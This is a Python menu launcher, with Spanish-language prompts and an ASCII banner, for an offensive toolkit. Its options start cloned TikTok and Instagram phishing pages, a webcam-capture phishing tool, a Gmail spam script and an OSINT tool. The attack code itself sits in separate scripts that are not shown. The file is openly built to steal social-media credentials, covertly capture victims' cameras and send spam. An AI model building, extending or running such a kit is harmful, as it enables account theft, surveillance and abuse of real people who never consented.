from rich.console import Console
from rich.text import Text
from rich.panel import Panel
import os
import subprocess

console = Console()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def instagram_phishing():
    print("[*] Ejecutando Instagram Phishing Page...\n")
    try:
        os.chdir("instagram-clon")
        subprocess.Popen(["python", "app.py"], shell=True)
        print("[✓] Servidor de Instagram iniciado en http://localhost:5000")
        os.chdir("..")
    except Exception as e:
        print(f"[!] Error al iniciar Instagram Phishing: {e}")


def tiktok_phishing():
    print("[*] Ejecutando TikTok Phishing Page...\n")
    try:
        os.chdir("tiktok-clon")
        os.system("python app.py")
        os.chdir("..")
    except Exception as e:
        print(f"[!] Error al iniciar TikTok Phishing: {e}")
        input("Presiona Enter para continuar...")


def cam_phish():
    print("[*] Ejecutando CAM PHISH...\n")
    try:
        os.chdir("phishing CAM")
        os.system("camphish_app.py")
        os.chdir("..")
    except Exception as e:
        print(f"[!] Error al iniciar CAM PHISH: {e}")
        input("Presiona Enter para continuar...")



def spam_gmail():
    print("[*] Ejecutando Spam Gmail...\n")
    try:
        os.chdir("INACTIVO-SPAM")
        os.system("python inactivo_spam.py")
        os.chdir("..")
    except Exception as e:
        print(f"[!] Error al iniciar Spam Gmail: {e}")
        input("Presiona Enter para continuar...")


def osint_x4t():
    print("[*] Ejecutando Osint x4t...\n")
    try:
        os.chdir("osintX4T")
        os.system("python inactivo_osint.py")
        os.chdir("..")
    except Exception as e:
        print(f"[!] Error al iniciar Osint X4T: {e}")
        input("Presiona Enter para continuar...")



def banner():
    banner_text = """
 ██▓ ███▄    █  ▄▄▄       ▄████▄  ▄▄▄█████▓ ██▓ ██▒   █▓ ▒█████     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
▓██▒ ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▓██░   █▒▒██▒  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▒██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒██░  ██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░  ▒██ █░░▒██   ██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
░██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░  ▒██▒ ░ ░██░   ▒▀█░  ░ ████▓▒░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
░▓  ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░  ▒ ░░   ░▓     ░ ▐░  ░ ▒░▒░▒░      ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ░ ▒  ░
 ▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒       ░     ▒ ░   ░ ░░    ░ ▒ ▒░        ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
 ▒ ░   ░   ░ ░   ░   ▒   ░          ░       ▒ ░     ░░  ░ ░ ░ ▒       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
 ░           ░       ░  ░░ ░                ░        ░      ░ ░                  ░ ░      ░ ░      ░  ░
                         ░                          ░                                                  
"""
    banner_styled = Text()
    colors = ["#63008A", "#6300A0", "#4A0079", "#50007B", "#64009E"]
    lines = banner_text.strip("\n").split("\n")

    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        banner_styled.append(line + "\n", style=f"bold {color}")

    console.print(banner_styled)


def main_menu():
    while True:
        clear()
        banner()

        colors = ["#63008A", "#6300A0", "#4A0079", "#50007B", "#64009E"]

        lines = [
            "┌─────────────────────────────────────────────┐",
            "│           ⚒️ CREATED BY AMIN                │ ",
            "└─────────────────────────────────────────────┘",
            "│",
            "├── 🎣  PHISHING",
            "│   ├── [1] TikTok Phishing Page",
            "│   ├── [2] Instagram Phishing Page",
            "│   └── [3] CAM PHISH",
            "│",
            "├── 🔧  UTILITIES",
            "│   └── [4] Spam Gmail",
            "│",
            "└── 🕵️‍♂️  OSINT",
            "    └── [5] Tools Osint",
            "",
        ]

        menu = Text()
        for i, line in enumerate(lines):
            color = colors[i % len(colors)]
            menu.append(line + "\n", style=f"bold {color}")

        console.print(menu)

        choice = input("\nSelecciona una opción: ")

        if choice == "1":
            tiktok_phishing()
        elif choice == "2":
            instagram_phishing()
        elif choice == "3":
            cam_phish()
        elif choice == "4":
            spam_gmail()
        elif choice == "5":
            osint_x4t()
        else:
            print("Opción inválida.")

        input("Presiona Enter para continuar...")


if __name__ == "__main__":
    main_menu()